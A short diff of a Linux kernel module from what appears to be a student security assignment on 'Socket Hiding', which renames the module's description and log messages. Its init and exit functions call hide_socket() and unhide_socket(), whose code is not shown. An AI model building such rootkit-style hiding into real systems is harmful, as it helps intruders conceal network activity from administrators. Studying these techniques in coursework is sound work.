@@ -7,19 +7,19 @@
 MODULE_LICENSE("GPL");
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
-#define DRIVER_DESC   "Assigment 5 - Code Hiding"
+#define DRIVER_DESC   "Assigment 6 - Socket Hiding"
 
 static int __init mod_init(void)
 {
   hide_socket();
-  printk(KERN_INFO "mod_init\n");
+  printk(KERN_INFO "Hide Sockets\n");
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
   unhide_socket();
-  printk(KERN_INFO "mod_exit\n");
+  printk(KERN_INFO "Unhide Sockets\n");
 }
 
 
